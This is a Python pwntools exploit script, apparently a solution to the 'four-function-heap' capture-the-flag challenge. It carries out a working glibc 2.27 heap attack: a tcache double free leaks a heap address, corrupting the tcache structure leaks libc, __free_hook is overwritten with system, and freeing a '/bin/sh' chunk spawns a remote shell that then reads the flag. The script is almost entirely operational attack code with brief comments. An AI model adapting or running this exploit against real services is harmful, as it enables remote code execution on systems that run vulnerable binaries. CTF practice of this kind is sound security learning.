from pwn import *

libc = ELF('./libc-2.27.so')
#p = process('./four-function-heap')
p = remote('2020.redpwnc.tf', 31774)

def do_alloc(size, content):
	p.recvuntil('{{menu}}')
	p.sendline('1')
	p.sendline('0')
	p.sendline(str(size))
	p.sendline(content)

def do_free():
	p.recvuntil('{{menu}}')
	p.sendline('2')
	p.sendline('0')

def do_print():
	p.recvuntil('{{menu}}')
	p.sendline('3')
	p.sendline('0')

def extract(leak):
	return u64(leak + '\x00' * (8-len(leak)))

input('[[ LEAK HEAP ]]')
print('[DOUBLE FREE]')
do_alloc(584, "this doesn't matter")
# Just free twice; I :heart: tcache
do_free()
do_free()
print('[LEAK]')
# This is tcache's fwd pointer, which is us and gives heap
do_print()

print('[EXTRACT]')
# Some boring extraction procedure
leak = p.recvuntil('{{flavortext.use_after_free}}')
leak = ''.join(chr(c) for c in leak)
leak = leak.split('\n')[-2]
leak = leak.split()[-1]
leak = extract(leak)
TCACHE = leak - 0x7fffd5a74260 + 0x7fffd5a74000 + 0x10
print('=== & TCACHE : {} ==='.format(hex(TCACHE)))

input('[[ LEAK LIBC ]]')
print('[OVERWRITE TCACHE]')
# Overwriting the forward pointer on top of tcache because evil
do_alloc(584, p64(TCACHE))
do_alloc(584, 'this pushes tcache onto freelist')
# Writing directly onto tcache because evil
my_tcache = b'\x07' * 8 * 2 * 3 + p64(TCACHE) * 55
do_alloc(584, my_tcache)
print('[FREE TCACHE]')
# Our overwriting says that tcache is full; this is on smallbin
do_free()
print('[LEAK]')
# Just leak that smallbin pointer
do_print()
print('[EXTRACT]')
# The same boring extraction procedure
leak = p.recvuntil('{{flavortext.use_after_free}}')
leak = ''.join(chr(c) for c in leak)
leak = leak.split('\n')[-2]
leak = leak.split()[-1]
# Sometimes we have to give it a little bit of help
# This libc leak only works 50%, but that's good enough
while len(leak) < 6: leak = '\x00'+leak
leak = extract(leak)
libc.address = leak + 0x7f5a0e000000 - 0x7f5a0e3ebc00
print('=== LIBC BASE : {} ==='.format(hex(libc.address)))
hook = libc.symbols['__free_hook']
system = libc.symbols['system']
print('=== FREE HOOK : {} ==='.format(hex(hook)))
print('=== SYSTEM : {} ==='.format(hex(system)))

input('[[ GET SHELL ]]')
# Write free_hook along the top and tcache towards the bottom
my_tcache = b'\x01'*8*2*3 + p64(hook)*10 + p64(TCACHE)*45
print('[OVERWRITE TCACHE]')
do_alloc(584, my_tcache)
print('[OVERWRITE HOOK]')
# This is small, so it corresponds to one of the hooks
do_alloc(100, p64(system))
print('[SYSTEM("BIN/SH")]')
# This is large, so it corresponds to one of the tcaches
# Write /bin/sh while we're here
do_alloc(584, '/bin/sh\x00'*2)
do_free()

# Cleaning up for the user
p.recvuntil('{{prompts.index}}: ')
p.sendline('cat flag.txt')
p.interactive()
p.close()
